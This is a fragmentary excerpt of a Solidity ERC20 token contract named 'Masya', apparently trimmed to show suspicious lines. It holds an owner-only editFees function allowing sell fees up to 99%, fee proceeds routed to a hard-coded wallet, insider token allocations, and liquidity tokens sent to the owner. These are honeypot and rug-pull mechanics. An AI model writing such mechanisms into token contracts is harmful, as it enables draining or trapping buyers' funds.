...
contract Masya is Context, IERC20, Ownable {
    ...
    string private constant _name = unicode"Maysa";
    string private constant _symbol = unicode"MAYSA";
    ...
    address payable private _aumildar; 
    ...
    constructor () payable {
        ...
        _aumildar = payable(0xCd9f7A7B975B3505B5bEB1D9bdaf3BFcAcc48888);
        _tOwned[address(_deployer)] = _tTotal.div(20);
        uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _tOwned[address(0x09eA6174DcBc092e786a93872d5FA7b9beF2488D)] = _tTotal.div(10);
    ...
    function editFees(uint256 one, uint256 two) public onlyOwner {
        require(one <= 350 && two <= 990,"Max buy fee 35%, No max sell fee");
        fee1 = one;
        fee2 = two;
    }
    ...
    function sendETHToFee(uint256 amount) private {
        ...
        _aumildar.transfer(amount.mul(2).div(3));
    }
    
    function openTrading() external onlyOwner() {
        require(!tradingOpen,"trading is already open");
        addLiquidity(balanceOf(address(this)).mul(80).div(100),address(this).balance,owner());
        swapEnabled = true;
        tradingOpen = true;
        limitsEnabled = true;
